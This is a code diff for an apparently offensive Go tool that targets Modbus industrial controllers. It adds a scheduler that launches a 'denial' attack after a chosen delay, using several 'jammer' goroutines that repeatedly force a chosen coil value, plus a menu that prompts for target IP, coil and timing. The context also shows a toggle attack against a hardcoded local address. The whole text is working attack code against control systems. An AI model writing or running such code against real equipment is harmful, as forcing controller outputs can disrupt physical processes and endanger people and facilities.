@@ -29,6 +29,15 @@ func modbusConnection(ip_address string) modbus.Client {
 	return client
 }
 
+func timeDelay(timeMin int, ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
+	timer2 := time.NewTimer(time.Duration(timeMin) * time.Minute)
+	go func() {
+		<-timer2.C
+		fmt.Println("Begining delayed attack...")
+		go denial(ip_address, jamming, runtime, coil, coil_val)
+	}()
+}
+
 func jammer(target modbus.Client, coil uint16, coil_value int) {
 	for {
 		if coil_value == 1 {
@@ -126,7 +135,32 @@ func main() {
 			fmt.Scanln(&coil_value)
 
 			go toggle("192.168.13.86", 0, coil_value)
-		}
+		} else if userSelection == 3 {
+			var ip_address string
+			fmt.Println("Enter an ip address")
+			fmt.Scanln(&ip_address)
 
+			var jamming int
+			fmt.Println("Enter a number of jammers")
+			fmt.Scanln(&jamming)
+
+			var runtime int
+			fmt.Println("Enter a runtime:")
+			fmt.Scanln(&runtime)
+
+			var coil uint16
+			fmt.Println("Enter a coil:")
+			fmt.Scanln(&coil)
+
+			var coil_value int
+			fmt.Println("Enter a coil value:")
+			fmt.Scanln(&coil_value)
+
+			var timeMin int
+			fmt.Println("Enter how many minutes you want to delay your attack before occuring:")
+			fmt.Scanln(&timeMin)
+
+			go timeDelay(timeMin, ip_address, jamming, runtime, coil, coil_value)
+		}
 	}
 }
